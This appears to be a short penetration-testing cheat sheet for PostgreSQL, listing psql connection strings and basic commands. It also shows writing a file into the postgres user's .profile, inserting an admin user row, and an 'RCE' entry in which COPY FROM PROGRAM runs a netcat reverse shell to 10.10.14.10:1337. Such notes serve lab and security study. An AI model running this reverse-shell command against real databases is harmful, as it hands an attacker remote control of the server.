---
title: "Postgresql"
date: 2024-7-9
tags: ["postgresql", "database"]
---

---
### General

#### Connect to postgresql Database

```bash
psql -h 127.0.0.1 -U <USER> -p 5432 -d <DB_NAME>
```

```bash
psql postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>
```

#### Basic Commands

```bash
# Show databases
\list
```

```bash
# Use database
\connect <DB_NAME>
```

```bash
# Show tables in current database
\dt
```

```bash
# Dump data from table
select * from <TABLE_NAME>;
```

```bash
# Insert data into table (e.g)
insert into <TABLE_NAME> (username, password, role) values ('user', 'password', 'admin');
```

```bash
# Write text
copy (select 'test') to '/var/lib/postgresql/.profile';
```

```bash
# Exit
\q
```

### RCE

```bash
# Only superuser
CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash 10.10.14.10 1337 &'
```

<br>